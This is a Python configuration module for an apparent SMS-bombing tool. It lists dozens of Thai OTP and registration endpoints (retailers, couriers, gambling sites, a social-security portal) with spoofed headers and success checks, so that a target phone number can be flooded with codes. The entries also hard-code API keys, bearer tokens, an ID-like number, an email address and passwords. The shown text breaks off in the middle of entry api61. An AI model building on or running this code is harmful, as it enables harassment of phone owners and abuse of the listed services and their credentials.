# -*- coding: utf-8 -*-
# program/API_LIST.py
import json
import random
from string import ascii_uppercase, ascii_lowercase, digits

try:
    from fake_useragent import UserAgent
    _ua = UserAgent()
    def get_ua():
        try:
            return _ua.random
        except Exception:
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
except ImportError:
    def get_ua():
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"

class _UAProxy:
    @property
    def random(self):
        return get_ua()

ua = _UAProxy()

def randomString(N):
    return ''.join(random.choice(ascii_uppercase + digits) for _ in range(N))

def randomHex(N):
    return ''.join(random.choice('0123456789abcdef') for _ in range(N))

def no_zero(p: str) -> str:
    """ตัดเลข 0 ตัวหน้าออก เช่น 0933739687 -> 933739687"""
    return p[1:] if p.startswith("0") else p

def get_common_headers(referer=None, origin=None, content_type="application/json"):
    headers = {
        "User-Agent": ua.random,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    if referer:
        headers["Referer"] = referer
    if origin:
        headers["Origin"] = origin
    if content_type:
        headers["Content-Type"] = content_type
    return headers

# ==========================================
# 🛡️ STRICT SUCCESS CHECK HELPER
# ==========================================
def strict_check(text: str, must_have=None, allow_empty=False) -> bool:
    """
    ตรวจสอบ Response แบบเข้มงวด:
    - ปฏิเสธหน้าเว็บ HTML (<!doctype, <html, <head, <title, 404, 403, 405, 429, 500)
    - ปฏิเสธ WAF / Cloudflare / BytePlus / Akamai / Captcha
    - ปฏิเสธ JSON ที่มี error / status:false / success:false / code:404 ฯลฯ
    - ต้องพบคำใน must_have อย่างน้อย 1 คำจึงจะถือว่า PASS
    """
    if not text or not text.strip():
        return allow_empty

    t = text.strip()
    t_low = t.lower()
    t_nospace = t_low.replace(" ", "").replace("\n", "").replace("\r", "").replace("\t", "")

    # 1. ปฏิเสธ HTML / หน้า Error เว็บไซต์ทั้งหมด
    html_markers = [
        "<!doctype", "<html", "<head", "<title", "<body", "<h1",
        "404 not found", "page not found", "404; not found", "404.html",
        "429 too many requests", "access denied", "attention required!",
        "just a moment...", "security check in progress", "slim application error",
        "method not allowed", "invalid url", "bad gateway", "service unavailable",
        "cloudflare", "edgesuite.net", "aliyun.com", "byteplus", "โอ้ไม่ ไม่พบ"
    ]
    if any(m in t_low for m in html_markers):
        return False

    # 2. ปฏิเสธ JSON Error / Failure Patterns ที่พบบ่อย
    fail_nospace = [
        '"error":true', '"success":false', '"issuccess":false', '"status":false',
        '"status":"error"', '"status":"fail"', '"status":400', '"status":401',
        '"status":403', '"status":404', '"status":405', '"status":429', '"status":500',
        '"statuscode":400', '"statuscode":401', '"statuscode":403', '"statuscode":404',
        '"statuscode":405', '"statuscode":429', '"statuscode":500',
        '"code":400', '"code":401', '"code":403', '"code":404', '"code":405',
        '"code":406', '"code":429', '"code":500', '"code":"400"', '"code":"404"',
        '"code":"406"', '"msgcode":"400"', '"msgcode":"404"', '"code":-20068',
        '"code":40000', '"errorcode":400', '"data":null'
    ]
    # ยกเว้นกรณีมี must_have ที่ยืนยันความสำเร็จชัดเจน แต่ต้องไม่มี error ซ้อน
    if any(f in t_nospace for f in fail_nospace):
        return False

    fail_keywords = [
        "persistedquerynotfound", "notfounderror", "api page not found",
        "no http resource was found", "missing authentication token",
        "captcha not provided", "recaptcha verification failed",
        "csrf token ไม่ถูกต้อง", "ไม่สามารถยืนยันตัวตนได้", "ทำรายการไม่สำเร็จ",
        "ไม่มี prefix นี้", "ไม่พบเอเย่นต์นี้", "รหัส otp ไม่ถูกต้อง",
        "otp_wrong", "maximum quota limit", "please upgrade the app",
        "is required", "invalid uuid", "invalid parameter", "blocked because of security"
    ]
    if any(k in t_low for k in fail_keywords):
        return False

    # 3. ตรวจสอบคำบังคับ (must_have)
    if must_have:
        if isinstance(must_have, str):
            must_have = [must_have]
        return any(
            (k.lower() in t_low) or (k.lower().replace(" ", "") in t_nospace)
            for k in must_have
        )

    # 4. หากไม่ได้ระบุ must_have ให้เช็คว่ามีสัญญาณของ OTP / Success มาตรฐานหรือไม่
    default_success = [
        '"status":"success"', '"status":1', '"status":200', '"status":true',
        '"success":true', '"issuccess":true', '"is_success":true',
        '"code":0', '"code":200', '"code":"0"', '"code":"200"', '"code":"000"', '"code":"001"',
        '"codeexp":"001"', '"detail":"success"', '"message":"ok"', '"title":"ok"',
        'otp is requested', 'ส่งรหัส otp', 'ดำเนินการสำเร็จ', 'codedeliverydetails',
        'otpgeneratephone', '"otpid":', '"reference":', '"ref":', '"token":'
    ]
    return any(s in t_nospace or s in t_low for s in default_success)


# ==========================================
# 📋 API CONFIGURATION (160 ENDPOINTS)
# ==========================================
API_CONFIG = {
    "api1": {
        "name": "Gogo-Shop",
        "url": "https://gogo-shop.com/app/index/send_sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gogo-shop.com/app/index/register", "https://gogo-shop.com", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"type=1&telephone={p}&select=66",
        "success_check": lambda r: strict_check(r, ['"code":1', '"status":1'])
    },
    "api2": {
        "name": "Kex-Express",
        "url": "https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{phone}",
        "method": "POST",
        "headers": lambda: {"Appid": "Website_Api", "Appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2", "User-Agent": ua.random, "Origin": "https://th.kex-express.com", "Referer": "https://th.kex-express.com/"},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"code":200', '"detail":"success"', '"reference"'])
    },
    "api3": {
        "name": "Jaomuehuay",
        "url": "https://jaomuehuay.io/api/auth/send-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jaomuehuay.io/register/jaomuehuay", "https://jaomuehuay.io"),
        "data": lambda p: {"phone_number": p, "affiliateCode": "jaomuehuay", "type": 1},
        "success_check": lambda r: strict_check(r, ['"Success":true', '"success":true'])
    },
    "api4": {
        "name": "Jut8",
        "url": "https://www.jut8.com/api/user/request-register-tac",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.jut8.com/th-th?signup=1", "https://www.jut8.com"),
        "data": lambda p: {"uname": "", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": p, "language": "th", "langCountry": "th-th"},
        "success_check": lambda r: strict_check(r, ['"status":true', '"code":1'])
    },
    "api5": {
        "name": "Cdo888",
        "url": "https://m.cdo888.bet/ajax/submitOTP",
        "method": "POST",
        "headers": lambda: get_common_headers("https://m.cdo888.bet/user/register", "https://m.cdo888.bet", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"send_otp={p}",
        "success_check": lambda r: strict_check(r, ['"status":"success"'])
    },
    "api6": {
        "name": "Joneslot",
        "url": "https://www.joneslot.me/pussy888/otp.php?m=request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.joneslot.me/pussy888/register", "https://www.joneslot.me", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: strict_check(r, ['"errorCode":0', '"status":"success"'])
    },
    "api7": {
        "name": "Swin168",
        "url": "https://play.swin168.me/api/register/sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://play.swin168.me/register/", "https://play.swin168.me"),
        "data": lambda p: {"phone": p, "agent_id": 1, "country_code": "TH"},
        "success_check": lambda r: strict_check(r, ['"success":true', '"status":"success"'])
    },
    "api8": {
        "name": "Johnwick168",
        "url": "https://www.johnwick168.me/signup.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.johnwick168.me/signup.php", "https://www.johnwick168.me", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"act=step-1&tel={p}",
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200', 'otp'])
    },
    "api9": {
        "name": "Skyslot7",
        "url": "https://skyslot7.me/member/otp.php?m=request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://skyslot7.me/member/register", "https://skyslot7.me", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: strict_check(r, ['"errorCode":0', '"status":"success"'])
    },
    "api10": {
        "name": "Mgi88",
        "url": "https://mgi88.me/api/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mgi88.me/", "https://mgi88.me"),
        "data": lambda p: {"telefon_number": p, "registrera_typ": ""},
        "success_check": lambda r: strict_check(r, ['"code":200', '"status":"success"'])
    },
    "api11": {
        "name": "DeeCasino",
        "url": "https://play.dee.casino/api/register/sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://play.dee.casino/register", "https://play.dee.casino"),
        "data": lambda p: {"phone": p, "agent_id": 1, "country_code": "TH"},
        "success_check": lambda r: strict_check(r, ['"success":true', '"status":true'])
    },
    "api12": {
        "name": "Mgame666",
        "url": "https://gw.mgame666.com/AuthAPI/SendSms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://okmega.pgm77.com/", "https://okmega.pgm77.com"),
        "data": lambda p: {"Phone": p},
        "success_check": lambda r: strict_check(r, ['"status":true', '"success":true', '"code":200', '"code":0'])
    },
    "api13": {
        "name": "Prompkai",
        "url": "https://api.prompkai.com/auth/preRegister",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.prompkai.com/", "https://www.prompkai.com"),
        "data": lambda p: {"username": p},
        "success_check": lambda r: strict_check(r, ['"error":false'])
    },
    "api14": {
        "name": "Fun24",
        "url": "https://www.fun24.bet/_ajax_/v3/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.fun24.bet/", "https://www.fun24.bet", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phoneNumber={p}",
        "success_check": lambda r: r.strip() == "[]" or strict_check(r, ['"success":true'])
    },
    "api15": {
        "name": "Wm78bet",
        "url": "https://wm78bet.bet/_ajax_/v3/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wm78bet.bet/", "https://wm78bet.bet", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phoneNumber={p}",
        "success_check": lambda r: r.strip() == "[]" or strict_check(r, ['"success":true'])
    },
    "api16": {
        "name": "Happy168",
        "url": "https://m.happy168.xyz/api/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://m.happy168.xyz/?hid=V0H3O1B4TH", "https://m.happy168.xyz"),
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: strict_check(r, ['"code":200', '"status":"success"'])
    },
    "api17": {
        "name": "Pgheng",
        "url": "https://pgheng.amaheng.com/api/otp?lang=th",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pgheng.amaheng.com/register?hid=T0F1K1A5RC", "https://pgheng.amaheng.com"),
        "data": lambda p: {"phone_number": p, "register_type": "", "type_otp": "register"},
        "success_check": lambda r: strict_check(r, ['"code":200', '"status":"success"'])
    },
    "api18": {
        "name": "Aplusfun",
        "url": "https://www.aplusfun.bet/_ajax_/v3/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.aplusfun.bet/", "https://www.aplusfun.bet", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phoneNumber={p}",
        "success_check": lambda r: r.strip() == "[]" or strict_check(r, ['"success":true'])
    },
    "api19": {
        "name": "Cueu77778887",
        "url": "https://api-players.cueu77778887.com/register-otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Origin": "https://lcbet44.electrikora.com", "Referer": "https://lcbet44.electrikora.com/", "X-Exp-Signature": "62b3e4c0138d8500127860d5", "Content-Type": "application/json"},
        "data": lambda p: {"brands_id": "62b3e4c0138d8500127860d5", "tel": p, "token": "", "captcha_id": "", "lot_number": "", "pass_token": "", "gen_time": "", "captcha_output": ""},
        "success_check": lambda r: strict_check(r, ["ดำเนินการสำเร็จ", '"codeEXP":"001"'])
    },
    "api20": {
        "name": "Oneforbet",
        "url": "https://api.oneforbet.com/auth/player/phone-check",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Origin": "https://ohana888.net", "Referer": "https://ohana888.net/", "X-Site-Id": "26336fef-e961-449c-926d-93db6afef9c4", "X-Agency-Id": "df87f52d-4221-49b6-b6cb-827f92244b72", "Content-Type": "application/json; charset=UTF-8"},
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api21": {
        "name": "Joker123ths",
        "url": "https://m.joker123ths.shop/api/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://m.joker123ths.shop/?hid=E0G3S1A4YH", "https://m.joker123ths.shop"),
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: strict_check(r, ['"code":200', '"status":"success"'])
    },
    "api22": {
        "name": "Pigspin",
        "url": "https://jklmn23456.com/api/v1/user/phone/verify",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Origin": "https://pigspin.org", "Referer": "https://pigspin.org/", "Content-Type": "application/json"},
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: strict_check(r, ['"status":"SUCCESS"', '"code":200'])
    },
    "api23": {
        "name": "i828th",
        "url": "https://www.i828th.com/api/user/request-register-tac",
        "method": "POST",
        "headers": lambda: {
            "Host": "www.i828th.com", "User-Agent": ua.random, "content-type": "application/json", "Origin": "https://www.i828th.com", "Referer": "https://www.i828th.com/th-th?signup=1",
            "Cookie": "prevUrl=https%3A%2F%2Fwww.google.com%2F; ipcountry=TH;" 
        },
        "data": lambda p: {"uname": f"66{no_zero(p)}", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": p, "language": "th", "langCountry": "th-th"},
        "success_check": lambda r: strict_check(r, ['"code":1', '"status":true'])
    },
    "api24": {
        "name": "Thai191",
        "url": "https://www.thai191.com/api/user/request-register-tac",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"sendType": "mobile", "currency": "THB", "country_code": "66", "mobileno": p, "language": "th", "langCountry": "th-th"},
        "success_check": lambda r: strict_check(r, ['"code":1', '"status":true'])
    },
    "api25": {
        "name": "Pgs42s",
        "url": "https://pgs42s.online/api/otp?lang=th",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"phone_number": p, "register_type": "", "type_otp": "register"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api26": {
        "name": "PgSlotIn",
        "url": "https://pgsoft.pgslotin.app/api/otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/json", "Origin": "https://pgsoft.pgslotin.app", "Referer": "https://pgsoft.pgslotin.app/"},
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api27": {
        "name": "Carsome",
        "url": "https://www.carsome.co.th/website/login/sendSMS",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.carsome.co.th/sell-car", "https://www.carsome.co.th"),
        "data": lambda p: {"username": p, "optType": 0},
        "success_check": lambda r: strict_check(r, ['"success":true', '"code":0'])
    },
    "api28": {
        "name": "SSO",
        "url": "https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp",
        "method": "POST",
        "headers": lambda: {
            "User-Agent": ua.random,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda p: f"dCard=1358231116147&Mobile={p}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER",
        "success_check": lambda r: strict_check(r, ['"status":true', '"status":"success"', 'ref'])
    },
    "api29": {
        "name": "Konvy",
        "url": "https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.konvy.com/", "https://www.konvy.com", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: strict_check(r, ['"status":1', '"code":200', '"msg":"success"'])
    },
    "api30": {
        "name": "TheConcert",
        "url": "https://www.theconcert.com/rest/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.theconcert.com/", "https://www.theconcert.com"),
        "data": lambda p: {"mobile": p, "country_code": "TH", "lang": "th", "channel": "sms", "digit": "4"},
        "success_check": lambda r: strict_check(r, ['"status":200', '"ref_code"', '"token"'])
    },
    "api31": {
        "name": "ShopGenix",
        "url": "https://shopgenix.com/api/sms/otp/",
        "method": "POST",
        "headers": lambda: {
            "Host": "shopgenix.com",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": ua.random,
            "origin": "https://shopgenix.com",
            "referer": "https://shopgenix.com/app/5364874/"
        },
        "data": lambda p: f"mobile_country_id=1&mobile={p}",
        "success_check": lambda r: strict_check(r, ['"status":true', '"success":true', '"ref"'])
    },
    "api32": {
        "name": "NowBet",
        "url": "https://www.nowbet.com/th/api/sendotpth",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "user-agent": ua.random},
        "data": lambda p: f"countryCode=TH&mobileId={p}&lang=th",
        "success_check": lambda r: strict_check(r, ['"status":"000"', '"code":"000"', '"success":true'])
    },
    "api33": {
        "name": "YouPik",
        "url": "https://api.ulive.youpik.com/api-base/sms/sendCode",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded;charset=UTF-8", "user-agent": ua.random},
        "data": lambda p: f"phone={p}&type=1",
        "success_check": lambda r: strict_check(r, ['"success":true', '"code":200'])
    },
    "api34": {
        "name": "GkingBet",
        "url": "https://play.gkingbet.com/api/register/sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://play.gkingbet.com/", "https://play.gkingbet.com"),
        "data": lambda p: {"phone": p, "agent_id": 5, "country_code": "TH"},
        "success_check": lambda r: strict_check(r, ['"success":true', '"status":"success"'])
    },
    "api35": {
        "name": "TGFone",
        "url": "https://www.tgfone.com/signin/otp_chk_fast",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "user-agent": ua.random, "origin": "https://www.tgfone.com", "referer": "https://www.tgfone.com/login"},
        "data": lambda p: f"mobile={p}&type_otp=7",
        "success_check": lambda r: strict_check(r, ['"status":1', '"success":true', 'ref'])
    },
    "api36": {
        "name": "Beauticool",
        "url": "https://www.beauticool.com/?m=request_otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "user-agent": ua.random, "origin": "https://www.beauticool.com", "referer": "https://www.beauticool.com/m/signup_tel.php"},
        "data": lambda p: f"tel={p}",
        "success_check": lambda r: strict_check(r, ['"status":1', '"success":true', 'otp', 'ref'])
    },
    "api37": {
        "name": "SaGame",
        "url": "https://api.sa.game/api/Account/SendRegisterVerificationSms",
        "method": "POST",
        "headers": lambda: {"Accept": "application/json; charset=UTF-8", "User-Agent": ua.random, "lobbyId": "23", "userDeviceTypeId": "6", "Origin": "https://sa.game", "Referer": "https://sa.game/"},
        "data": lambda p: {"countryId": 7, "phoneNumber": p},
        "success_check": lambda r: strict_check(r, ['"Success":true', '"success":true', '"ErrorCode":0'])
    },
    "api38": {
        "name": "UfaClub99",
        "url": "https://ufaclub99.com/member/Register/Request_OTP",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "user-agent": ua.random, "origin": "https://ufaclub99.com", "referer": "https://ufaclub99.com/member/register"},
        "data": lambda p: f"phonetxt={p}",
        "success_check": lambda r: strict_check(r, ['"status":1', '"success":true'])
    },
    "api39": {
        "name": "UfaClub24",
        "url": "https://aff.ufaclub24.org/pin.php",
        "method": "POST",
        "headers": lambda: {"origin": "https://aff.ufaclub24.org", "content-type": "application/x-www-form-urlencoded", "user-agent": ua.random, "referer": "https://aff.ufaclub24.org/phoneregis.php?invitekey=41bfd20a38bb1b0bec75acf0845530a7"},
        "data": lambda p: f"invitekey=41bfd20a38bb1b0bec75acf0845530a7&txtTel={p}",
        "success_check": lambda r: strict_check(r, ['"status":1', '"success":true'])
    },
    "api40": {
        "name": "Ufa8",
        "url": "https://ufa8.co/register",
        "method": "POST",
        "headers": lambda: {"origin": "https://ufa8.co", "content-type": "application/x-www-form-urlencoded", "user-agent": ua.random, "referer": "https://ufa8.co/register"},
        "data": lambda p: f"register=1&phone={p}&password=Kan064402&password2=Kan064402&line=Garenarov",
        "success_check": lambda r: strict_check(r, ['"status":1', '"success":true'])
    },
    "api41": {
        "name": "ToppingTrue",
        "url": "https://topping.truemoveh.com/api/get_request_otp",
        "method": "POST",
        "headers": lambda: {"Accept": "application/json, text/plain, */*", "User-Agent": ua.random, "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://topping.truemoveh.com", "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104"},
        "data": lambda p: f"mobile_number={p}",
        "success_check": lambda r: strict_check(r, ['"otp_ref"', '"ref_code"', '"reference"'])
    },
    "api42": {
        "name": "Kerry",
        "url": "https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"status":200', '"reference"', '"token"'])
    },
    "api43": {
        "name": "CognitoAWS",
        "url": "https://cognito-idp.ap-southeast-1.amazonaws.com/",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-amz-json-1.1", "x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode", "user-agent": ua.random, "referer": "https://www.bugaboo.tv/members/resetpass/phone"},
        "data": lambda p: {"ClientId": "6g47av6ddfcvi06v4l186c16d6", "Username": f"+66{no_zero(p)}"},
        "success_check": lambda r: strict_check(r, ["CodeDeliveryDetails", "Destination"])
    },
    "api44": {
        "name": "BigThailand",
        "url": "https://www.bigthailand.com/authentication-service/user/OTP",
        "method": "POST",
        "headers": lambda: {
            "content-type": "application/json", "user-agent": ua.random,
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg"
        },
        "data": lambda p: {"locale": "th", "phone": f"+66{no_zero(p)}", "email": "dkdk@gmail.com", "userParams": {"buyerName": "ekek ks", "activateLink": "www.google.com"}},
        "success_check": lambda r: strict_check(r, ['"status":"SUCCESS"', '"otpId"'])
    },
    "api45": {
        "name": "Joox",
        "url": "https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{phone_no_zero}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",
        "method": "GET",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"code":0'])
    },
    "api46": {
        "name": "MakroClick",
        "url": "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
        "method": "POST",
        "headers": lambda: get_common_headers(),
        "data": lambda p: {"username": p, "password": "1111a1111A", "name": p, "provinceCode": "74", "districtCode": "970", "subdistrictCode": "8654", "zipcode": "94140", "siebelCustomerTypeId": "710", "locale": "th_TH"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"otp"'])
    },
    "api47": {
        "name": "Auto1",
        "url": "https://service-api.auto1.co.th/w/user/request-otp-on-register",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "user-agent": ua.random},
        "data": lambda p: {"ConsentFlag": "true", "AcceptPolicy": "true", "Tel": p, "OTPId": "", "Email": "", "FirstName": "", "LastName": ""},
        "success_check": lambda r: strict_check(r, ['"OTPId"', '"status":true'])
    },
    "api48": {
        "name": "SMomClub",
        "url": "https://login.s-momclub.com/accounts.otp.sendCode",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "user-agent": ua.random},
        "data": lambda p: f"phoneNumber=%2B66{no_zero(p)}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",
        "success_check": lambda r: strict_check(r, ['"errorCode":0', '"statusCode":200'])
    },
    "api49": {
        "name": "NocNoc",
        "url": "https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nocnoc.com/", "https://nocnoc.com"),
        "data": lambda p: {"lang": "th", "userType": "BUYER", "locale": "th", "orgIdfier": "scg", "phone": f"+66{no_zero(p)}", "type": "signup", "otpTemplate": "buyer_signup_otp_message", "userParams": {"buyerName": "dec"}},
        "success_check": lambda r: strict_check(r, ['"status":"SUCCESS"', '"otpId"'])
    },
    "api50": {
        "name": "GlobalHouse",
        "url": "https://api-globalhouse.com/sms/requestOTP",
        "method": "POST",
        "headers": lambda: {"authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc", "content-type": "application/json; charset=utf-8", "user-agent": ua.random, "origin": "https://m.globalhouse.co.th", "referer": "https://m.globalhouse.co.th/"},
        "data": lambda p: {"phonNumber": p},
        "success_check": lambda r: strict_check(r, ['"status":200', '"ref"'])
    },
    "api51": {
        "name": "GamingNation",
        "url": "https://gamingnation.dtac.co.th/api/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gamingnation.dtac.co.th/", "https://gamingnation.dtac.co.th"),
        "data": lambda p: {"template": "register", "phone_no": p, "token": ""},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api52": {
        "name": "1112Delivery",
        "url": "https://api.1112delivery.com/api/v1/otp/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.1112delivery.com/", "https://www.1112delivery.com"),
        "data": lambda p: {"phonenumber": p, "language": "th"},
        "success_check": lambda r: strict_check(r, ['"status":1', '"detail":"success"', '"ref"'])
    },
    "api53": {
        "name": "HDMall",
        "url": "https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "X-Requested-With": "XMLHttpRequest", "Accept": "application/json"},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"status":"ok"', '"success":true', '"ref"'])
    },
    "api54": {
        "name": "Kaitorasap",
        "url": "https://www.kaitorasap.co.th/api/index.php/send-otp-login-new/",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "User-Agent": ua.random},
        "data": lambda p: f"phone_number={p}&lag=",
        "success_check": lambda r: strict_check(r, ['"status":true', '"status":1', '"ref"'])
    },
    "api55": {
        "name": "Freshket",
        "url": "https://api-next-version.freshket.co/baseApi/Users/RequestOtp",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json;charset=UTF-8", "x-guest": "Julian"},
        "data": lambda p: {"isDev": "false", "language": "th", "phone": f"+66{no_zero(p)}"},
        "success_check": lambda r: strict_check(r, ['"is_success":true', '"data":true'])
    },
    "api56": {
        "name": "VCanBuy",
        "url": "https://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha_new?mobile=66-{phone_no_zero}",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Cookie": "_tt_enable_cookie=1"},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"code":200', '"status":1', '"success":true'])
    },
    "api57": {
        "name": "Konglor888",
        "url": "https://mapi.konglor888.com/api/otp/register",
        "method": "POST",
        "headers": lambda: get_common_headers("https://konglor888.com/", "https://konglor888.com"),
        "data": lambda p: {"applicant": p, "serviceName": "konglor888.com"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200', '"ref"'])
    },
    "api58": {
        "name": "Hit789",
        "url": "https://mapi.hit789.com/api/otp/register",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hit789.com/", "https://hit789.com"),
        "data": lambda p: {"applicant": p, "serviceName": "hit789.com"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200', '"ref"'])
    },
    "api59": {
        "name": "TrueIDVaccine",
        "url": "https://vaccine.trueid.net/vacc-verify/api/getotp",
        "method": "POST",
        "headers": lambda: get_common_headers(),
        "data": lambda p: {"msisdn": p, "function": "enroll"},
        "success_check": lambda r: strict_check(r, ['"code":200', '"status":"success"'])
    },
    "api60": {
        "name": "Fox888",
        "url": "https://lb-api.fox83-sy.xyz/api/otp/register",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fox888.com/", "https://fox888.com"),
        "data": lambda p: {"applicant": p, "serviceName": "fox888.com"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api61": {
        "name": "EzRegis",
